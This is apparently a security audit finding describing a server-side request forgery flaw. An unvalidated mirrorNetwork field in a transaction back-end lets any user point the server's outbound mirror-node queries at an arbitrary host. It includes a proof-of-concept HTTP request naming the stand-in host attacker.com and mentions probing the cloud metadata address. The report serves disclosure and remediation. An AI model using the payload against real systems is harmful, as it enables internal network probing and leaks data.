Audit Report

## Title
Server-Side Request Forgery (SSRF) via Unvalidated `mirrorNetwork` Field in Transaction Submission

## Summary
Any authenticated user can submit a transaction with an arbitrary `mirrorNetwork` value (e.g., `attacker.com`). The back-end stores this value without allowlist validation and later uses it to construct outbound HTTP URLs for mirror node queries. Because `MirrorNodeREST.fromBaseURL()` interpolates unrecognized values directly into `https://${mirrorNetwork}`, the server makes outbound HTTP requests to attacker-controlled endpoints — constituting a persistent Server-Side Request Forgery (SSRF).

## Finding Description

**Root cause — no allowlist on `mirrorNetwork` in `CreateTransactionDto`:**

`mirrorNetwork` is decorated only with `@IsNotEmpty()` and `@IsString()`. Any arbitrary hostname is accepted and persisted. [1](#0-0) 

**Vulnerable URL construction — `MirrorNodeREST.fromBaseURL()` default branch:**

When `mirrorNetwork` does not match `mainnet`, `testnet`, `previewnet`, or `local-node`, the value is interpolated directly into a URL with no sanitization: [2](#0-1) 

**HTTP request execution — `MirrorNodeClient.fetchAccountInfo()`:**

The constructed URL is used to make a live HTTP GET request with exponential-backoff retry (up to 3 attempts): [3](#0-2) 

**First trigger path — `AccountCacheService.getAccountInfoForTransaction()`:**

Reads `transaction.mirrorNetwork` directly and passes it through `fetchAndSaveAccountInfo()` → `mirrorNodeClient.fetchAccountInfo()`: [4](#0-3) 

**Second trigger — background cron job `refreshStaleAccounts()`:**

Runs every 30 seconds. Iterates over all stale `CachedAccount` rows, groups them by `account.mirrorNetwork`, and calls `accountCacheService.refreshAccount(account)` for each — again using the stored attacker-controlled value: [5](#0-4) [6](#0-5) 

## Impact Explanation

- **Server egress IP disclosure**: The attacker's server receives the outbound request and learns the back-end's egress IP address.
- **Account ID exfiltration**: The attacker observes which Hedera account IDs (payer, receiver, etc.) the server queries.
- **Internal network probing**: By supplying values like `169.254.169.254` (AWS metadata endpoint), `10.0.0.1`, or internal service hostnames, the attacker can probe internal infrastructure not exposed to the internet. The retry logic (`MAX_RETRIES: 3`) amplifies each probe into up to 3 requests.
- **Persistent SSRF**: The cron job `refreshStaleCache()` (every 30 seconds) continues issuing requests to the attacker-controlled host for as long as the `CachedAccount` row exists, making this a persistent rather than one-shot SSRF. [7](#0-6) 

## Likelihood Explanation

Any registered user can trigger this. No admin or privileged role is required — only a valid JWT token to call `POST /transactions`. The `mirrorNetwork` field is explicitly designed to accept custom values (the front-end has a "Custom Node" UI that sets arbitrary hostnames), so there is no existing server-side guard. The cron-based re-trigger means a single malicious transaction submission causes repeated outbound requests indefinitely. [1](#0-0) [8](#0-7) 

## Recommendation

1. **Allowlist `mirrorNetwork` on the server side.** In `CreateTransactionDto`, replace `@IsString()` / `@IsNotEmpty()` with an explicit `@IsIn(['mainnet', 'testnet', 'previewnet', 'local-node'])` decorator, or add a custom validator that also permits a well-formed hostname/IP only if the deployment is configured to allow custom nodes.

2. **Validate in `MirrorNodeREST.fromBaseURL()`.** The `default` branch should throw or return a safe error rather than blindly interpolating the input:
   ```typescript
   default:
     throw new Error(`Unsupported mirror network: ${mirrorNetwork}`);
   ```

3. **Restrict outbound HTTP at the network layer.** Use egress firewall rules or an HTTP proxy allowlist so the back-end can only reach known mirror node endpoints, providing defense-in-depth even if the application-level guard is bypassed.

## Proof of Concept

```http
POST /transactions HTTP/1.1
Authorization: Bearer <valid_jwt>
Content-Type: application/json

{
  "name": "SSRF Test",
  "description": "SSRF via mirrorNetwork",
  "transactionBytes": "<valid_hex>",
  "creatorKeyId": 1,
  "signature": "<valid_hex>",
  "mirrorNetwork": "attacker.com"
}
```

1. The request passes `@IsString()` / `@IsNotEmpty()` validation and is persisted with `mirrorNetwork = "attacker.com"`.
2. During transaction processing, `getAccountInfoForTransaction(transaction, accountId)` is called with `transaction.mirrorNetwork = "attacker.com"`.
3. `MirrorNodeREST.fromBaseURL("attacker.com")` returns `"https://attacker.com"` (default branch, line 39 of `mirrorNode/index.ts`).
4. The server issues `GET https://attacker.com/api/v1/accounts/{accountId}` (up to 3 times due to retry logic).
5. Every subsequent `refreshStaleCache()` cron tick (every 30 seconds) repeats step 4 for every stale `CachedAccount` row associated with the attacker's transaction. [9](#0-8) [10](#0-9) [11](#0-10)
